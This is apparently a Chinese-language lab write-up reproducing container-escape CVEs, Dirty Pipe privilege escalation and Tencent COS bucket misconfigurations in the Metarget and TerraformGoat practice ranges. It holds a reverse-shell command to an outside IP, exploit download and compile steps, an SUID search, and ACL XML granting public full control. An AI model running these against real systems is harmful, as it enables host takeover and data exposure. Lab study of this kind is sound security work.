# project01  基于metarget漏洞复现                                                                             
一、start.......安装配置metarget靶场

1.拉取代码
root@VM-8-3-ubuntu:# git clone https://github.com/Metarget/metarget.git

2.切换目录
root@VM-8-3-ubuntu:# cd metarget/

3.安装依赖
root@VM-8-3-ubuntu:~/metarget# pip3 install -r requirements.txt

![image](https://github.com/user-attachments/assets/9ee7780c-38a3-484c-8455-34d2c8c8e46b)



## 1.	cve-2018-15664 ：Docker CP任意读写主机文件 （容器逃逸）

漏洞概述：

2019年6月份，Docker容器被曝存在权限逃逸安全漏洞(漏洞编号:CVE-2018-15664)，攻击者可利用此漏洞访问主机文件系统的任意文件，该漏洞攻击的基本前提是FllowSymlinkInScope遭受了最基本的TOCTOU攻击(即time-to-check-time-to-use攻击，黑客可利用窗口期在解析资源路径之后但在分配的程序开始在资源上操作之前修改路径)，这里的FllowSymlinkInScope的目的是获取一个既定路径并以安全的方式将其解析，就像该进程是在容器内那样,完整路径被解析后被解析的路径传递了一个比特位，之后在另外一个比特位上操作(在docker cp情况下，在创建流式传输到客户端的文档时打开)，如果攻击者能够在路径解析之后但在操作之前添加一个符号链接组件，那么就能以root身份在主机上解析符号链接路径组件，在"Docker cp"情况下它将导致任何人读取并写入主机任何路径的访问权限。

安装启动环境，查看版本

![image](https://github.com/user-attachments/assets/a224b3ec-36d2-40e3-b335-029301b82bee)

在这里找对应的POC，去做实验https://github.com/Metarget/cloud-native-security-book/tree/main

把poc放进metarget文件夹中，给两个执行文件（xx.sh为后缀）加上执行权限。如：chmod +x xxx.sh

![image](https://github.com/user-attachments/assets/973ded8d-b117-4464-a4fe-e9e978b4a96f)

![image](https://github.com/user-attachments/assets/9e5ec75d-bc5c-41bb-bbd2-c0411e270b83)

通过：执行命令

root@VM-8-3-ubuntu:~/metarget# ./run_write.sh 

FAILED -- HOST FILE UNCHANGED

Sending build context to Docker daemon  7.168kB

Step 1/11 : FROM opensuse/leap

Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)

Unable to find image 'cyphar/symlink_swap:latest' locally


docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).

See 'docker run --help'.

SUCCESS -- HOST FILE CHANGED

即可触发漏洞，完成复现


## 2. cve-2020-15257 （容器逃逸）

漏洞概述：

2020年12月01日，Containerd 官方发布安全更新，修复了 Docker 容器逃逸漏洞（CVE-2020-15257）。 Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸。Containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。

安装漏洞环境root@VM-8-3-ubuntu:~/metarget# sudo ./metarget cnv install cve-2020-15257

![image](https://github.com/user-attachments/assets/d1ced1be-4672-4a6a-ae32-0f5e32bc22e5)

查看docker版本，下载ubuntu:18.04

远程连接到容器内部并查看containerd-shim

![image](https://github.com/user-attachments/assets/6462fb9a-6a5d-4e15-925d-df9d3663bf78)

下载漏洞利用工具：https://github.com/cdk-team/CDK/releases/tag/v1.0.2

![image](https://github.com/user-attachments/assets/fb5ec1de-00c9-47eb-8f82-14bb19dd4c08)

使用docker cp目录复制到容器内部

root@VM-8-3-ubuntu:~/metarget# docker cp cdk_linux_amd64 fbf9212c0fe6:/

连接到容器

root@VM-8-3-ubuntu:~/metarget# sudo docker exec -it fbf9212c0fe6 /bin/bash

给执行权限给该cdk

root@VM-8-3-ubuntu:/# chmod +x cdk_linux_amd64 

使用该工具执行漏洞利用。

root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80  

（可能存在8888端口安全组没打开的情况）使用80端口，即可

![image](https://github.com/user-attachments/assets/eb1e8fa1-54d5-4d2c-afdb-894f214a5734)

成功获取shell

![image](https://github.com/user-attachments/assets/3ef7cb7c-c7ca-4ac2-8cf0-5dd0e1a9670a)


## 3.	cve-2019-5736 (runc容器逃逸)

漏洞概述：

2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞CVE-2019-5736。

漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。

攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runC执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。

安装环境

./metarget cnv install cve-2019-5736

![image](https://github.com/user-attachments/assets/9adbfc34-ce5c-4d0b-b1f4-9b98efcad554)

查看版本

![image](https://github.com/user-attachments/assets/cb9180c1-253b-462f-ba88-5db1d21f4158)

POC链接：

https://github.com/Frichetten/CVE-2019-5736-PoC

下载main.go并上传到服务器，修改payload信息

![image](https://github.com/user-attachments/assets/0067a375-7bc7-4105-bd4f-c68b5c727ee2)


编译

![image](https://github.com/user-attachments/assets/efe4a640-936e-4d98-9553-4eb4647b918f)

启动Ubuntu18的容器

把编译的main文件cp进去

然后登录容器

添加权限

执行POC，即可拿到shell

![image](https://github.com/user-attachments/assets/bd03b3be-97e4-44e4-bac0-5dced1943040)

成功拿shell

![image](https://github.com/user-attachments/assets/fda071fd-3574-4024-aba3-b0480297bb02)



## 4.	cve-2022-0847 ：Dirty Pipe （内核权限提升）

漏洞概述：

CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为"Dirty Pipe"。

环境安装

root@VM-8-3-ubuntu:~/metarget# ./metarget cnv install cve-2022-0847

![image](https://github.com/user-attachments/assets/c0ae4191-bac9-4a56-be40-a47c1c6b716b)



mkdir dirtypipez

cd dirtypipez




https://haxx.in/files/dirtypipez.c

访问网站，下载poc

![image](https://github.com/user-attachments/assets/da5ab737-a512-4443-9865-ddbaeb7a1b0c)

编译poc：

gcc dirtypipez.c -o dirtypipez

查找可以使用提权的命令

find / -perm -u=s -type f 2>/dev/null

![image](https://github.com/user-attachments/assets/dbc6c008-2689-411b-82f9-26a51bc33d61)

这里使用的是/bin/ping

./dirtypipez /bin/ping

![image](https://github.com/user-attachments/assets/b9262aae-fef8-4493-8999-21ef44a93467)
提权成功


end


# project02  基于TerraformGoat漏洞复现 

二、start.......TerraformGoat安装部署

root@VM-8-3-ubuntu:~# docker pull registry.cn-hongkong.aliyuncs.com/huoxian_pub/terraformgoat_tencentcloud:0.0.7

root@VM-8-3-ubuntu:~# docker run -itd --name terraformgoat_tencentcloud_0.0.7 registry.cn-hongkong.aliyuncs.com/huoxian_pub/terraformgoat_tencentcloud:0.0.7

root@VM-8-3-ubuntu:~# docker exec -it terraformgoat_tencentcloud_0.0.7 /bin/bash

![image](https://github.com/user-attachments/assets/0cdd859d-f68f-414e-94dd-fcee73a7a302)

部署完成

## 1.Bucket 对象遍历

cd /TerraformGoat/tencentcloud/cos/bucket_object_traversal/

编辑文件vim terraform.tfvars

输入key和id，保存退出

输入命令：terraform init

terraform apply

![image](https://github.com/user-attachments/assets/c5451360-c506-44b3-baa3-058a2be911a7)

看到地址

![image](https://github.com/user-attachments/assets/3d0f2133-cb81-4817-9033-b0410256ca5c)

看到key

![image](https://github.com/user-attachments/assets/bf3e7381-0985-4108-a29d-02135ab0fa04)

添加key访问（可以看到已经有对应的对象被访问/下载）

![image](https://github.com/user-attachments/assets/969cb15f-26c5-4a00-a53f-b8caa7e158d5)

到此存储桶对象遍历漏洞复现完成

销毁漏洞环境：

![image](https://github.com/user-attachments/assets/c8011a92-a4a5-449b-a1a0-51554f95450f)

## 2.任意文件上传

切换目录

cd /TerraformGoat/tencentcloud/cos/unrestricted_file_upload/

输入密钥和id

vim terraform.tfvars

![image](https://github.com/user-attachments/assets/132fb4ff-6286-42ad-b934-bda4c63521ad)

部署运行

terraform init

terraform apply

可以看到链接

![image](https://github.com/user-attachments/assets/b37b2e12-57f5-4f0f-acb7-018698eb1371)

访问

![image](https://github.com/user-attachments/assets/f666b463-6ef1-4849-b3c4-bc098a297a97)

拼接照片名字，发现可以下载

![image](https://github.com/user-attachments/assets/87e61964-4d80-4b3e-9a96-6eae2856ae83)

现在可以通过PUT方法来覆盖这个文件（在bp中抓包修改方法，重新发包）

![image](https://github.com/user-attachments/assets/4a838295-f40d-451c-990f-7f67618c3132)

再次访问，发现照片是损坏的，这个就是覆盖成功的效果

![image](https://github.com/user-attachments/assets/22a2aee5-df7e-4c23-ab5a-3a4cec9f4113)

销毁环境完成

![image](https://github.com/user-attachments/assets/4da506c6-980b-4bc9-8d43-4f53d1bd1096)

## 3.公开访问

在容器中执行以下命令

cd /TerraformGoat/tencentcloud/cos/bucket_public_access

编辑 terraform.tfvars 文件，在文件中填入的tencentcloud_secret_id和tencentcloud_secret_key

vim terraform.tfvars

在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey

部署靶场

terraform init

terraform apply

![image](https://github.com/user-attachments/assets/067a197d-d137-4f63-9000-88deb8ef4b1a)

![image](https://github.com/user-attachments/assets/003c9f33-f1cc-481c-828e-f14988671e03)

浏览器访问即可，公开访问是任意都可以访问

![image](https://github.com/user-attachments/assets/b6ae6f92-9970-4352-bfc9-1b29fe7fd47b)

销毁

![image](https://github.com/user-attachments/assets/9f496548-940a-49a4-a395-dc1bdea47f22)

## 4.ACL可写

这是一个用于构建腾讯云 COS Bucket ACL 可写的漏洞环境靶场。使用 Terraform 构建环境后，用户可以通过修改 Bucket 的 ACL 策略将原本无法访问的资源修改为可读，从而访问到 COS 服务资源。

环境搭建

在容器中执行以下命令

cd /TerraformGoat/tencentcloud/cos/bucket_acl_writable/

编辑 terraform.tfvars 文件，在文件中填入你的tencentcloud_secret_id和tencentcloud_secret_key

vim terraform.tfvars

在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey

部署靶场

terraform init

terraform apply

![image](https://github.com/user-attachments/assets/3cdf6d7d-5504-4284-8570-1f39e3811171)

访问（被拒绝），拼接?acl，发现可以访问

![image](https://github.com/user-attachments/assets/7a9ece5d-1678-4f43-bdb2-376d5f5a2fc5)

原始：

<Grant>
  
<Grantee xsi:type="Group">

<URI>http://cam.qcloud.com/groups/global/AllUsers</URI>

</Grantee>

<Permission>WRITE_ACP</Permission>

</Grant>

<Grant>
  
<Grantee xsi:type="Group">

<URI>http://cam.qcloud.com/groups/global/AllUsers</URI>

</Grantee>

<Permission>READ_ACP</Permission>

</Grant>

新的

<Grant>
  
<Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
  
<URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
    
</Grantee>
  
<Permission>FULL_CONTROL</Permission>
  
</Grant>

刷新，查看已经添加成功

![image](https://github.com/user-attachments/assets/633a2795-8cc2-4343-b075-7ad5c0771415)

![image](https://github.com/user-attachments/assets/2ff06ba5-100d-4609-a710-9434a6ff84b0)

摧毁

![image](https://github.com/user-attachments/assets/ce11f8a5-f03f-4a15-afac-0707860ffe53)


## 5.服务端加密未开启

这是一个用于构建腾讯云 COS Bucket 服务端加密未开启的场景。

场景构建

在容器中执行以下命令

cd /TerraformGoat/tencentcloud/cos/server_side_encryption_disable

编辑 terraform.tfvars 文件，在文件中填入你的tencentcloud_secret_id和tencentcloud_secret_key

vim terraform.tfvars

在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey

部署靶场

terraform init

![image](https://github.com/user-attachments/assets/402fa18c-0e3f-4914-8377-77c9e40c6b0d)

terraform apply

![image](https://github.com/user-attachments/assets/8e7fb71f-f953-4eb3-93d9-12ea27bb4a76)

打开，查看是未加密（照片）

![85eff7ba0ef95d7ad49f5340aaa7d32](https://github.com/user-attachments/assets/224b5bd8-6515-4178-b2c0-a1f145d51827)

销毁（照片）

![image](https://github.com/user-attachments/assets/ea222537-a88c-42fb-bf4c-7ea3df2e7913)









